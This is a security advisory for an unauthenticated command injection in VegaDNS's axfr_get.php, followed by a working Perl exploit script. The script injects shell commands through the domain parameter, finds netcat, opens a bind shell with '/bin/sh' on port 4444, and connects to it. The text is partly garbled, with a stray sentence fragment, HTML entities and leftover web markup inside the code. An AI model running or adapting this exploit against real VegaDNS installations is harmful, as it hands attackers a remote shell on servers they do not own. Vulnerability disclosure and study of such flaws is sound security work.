VegaDNS is a tinydns administration tool written in PHP to allow easy
administration of DNS records through a web browser.
-- http://www.vegadns.org
 
 
The file axfr_get.php allows unauthenticated access and fails to correctly
apply input escaping to all variables that is based on user input. This
allows an attacker to inject shell syntax constructs to take control of the
command execution.
 
The following code from axfr_get.php shows how the variable $file becomes
tainted trough the $domain variable which is tainted from direct user input.
variables, but fails to escape the $file variable.
 
---------------------------cut---------------------------
 * NOTE:
 *          This functionality ONLY exists outside of the main application
 *          because tcplient kept dying fatally due to file descriptor 7
 *          being unavailable, which only occurs AFTER session_start() is
 *          called.
 *
 */
require_once &#039;src/config.php&#039;;
// CHECKS
// Make sure the hostname was given
if(!isset($_REQUEST[&#039;hostname&#039;]) || $_REQUEST[&#039;hostname&#039;] == "") {
    echo "ERROR: no hostname given\n";
    exit;
}
// Make sure that some domains were given
if(!isset($_REQUEST[&#039;domain&#039;]) || $_REQUEST[&#039;domain&#039;] == "") {
    echo "ERROR: no domain was supplied\n";
    exit;
}
$domain = $_REQUEST[&#039;domain&#039;];
$hostname = $_REQUEST[&#039;hostname&#039;];
$rand = rand();
$file = "/tmp/$domain.$rand";
$command = "$dns_tools_dir/tcpclient -R &#039;".escapeshellcmd($hostname)."&#039; 53 $dns_tools_dir/axfr-get &#039;".escapeshellcmd($domain)."&#039; $file $file.tmp 2>&1";
exec($command, $out);
---------------------------end---------------------------
 
  ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
  ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
  █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
  ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
  ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
  ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
                                                                                                                                                                              ^;
 
print "  "."=" x 50 ."[justanotherhacker.com]==\n";
&usage if ($ARGV[0] !~ m!.+://([^/:]+)!);
$h=$1;
print "  . . . Locating netcat\n";
$cmd=&#039;which+nc&#039;;
$t=$ARGV[0]."/axfr_get?hostname=izunadrop&domain=%3b$cmd%3bagev";
$z=`curl -s -k &#039;$t&#039;`;
if ($z !~ m{/nc}) {
    print "  ! ! ! netcat not found! Manual exploitation required:\n";
    print "        $ARGV[0]/axfr_get?hostname=izunadrop&domain=%3bCMD%3b\n";
    exit 1;
}
print "  . . . netcat found: $z\n";
print "  . . . Performing IZUNA DROP!\n";
#  ← · ↑ · → · ↓ · <img draggable="false" class="emoji" alt="↖" src="https://s.w.org/images/core/emoji/2/svg/2196.svg"> · <img draggable="false" class="emoji" alt="↗" src="https://s.w.org/images/core/emoji/2/svg/2197.svg"> · <img draggable="false" class="emoji" alt="↘" src="https://s.w.org/images/core/emoji/2/svg/2198.svg"> · <img draggable="false" class="emoji" alt="↙" src="https://s.w.org/images/core/emoji/2/svg/2199.svg">
print "      ↓ ↓ ↑ *k* → → *p*\n";
$cmd="$z+-e+/bin/sh+-lp+4444";
$t=$ARGV[0]."/axfr_get?hostname=izunadrop&domain=%3b$cmd%3bagev";
$z=`curl -m 3 -s -k &#039;$t &&#039;`;
print $vg."\n";
print "  . . . K.O ! ! ! Connecting to bindshell on $h port 4444\n";
system("nc -v $h 4444");
sub usage { print "Usage $0 http://host/path/to/vegadns\n\n$ARGV[0]"; exit;

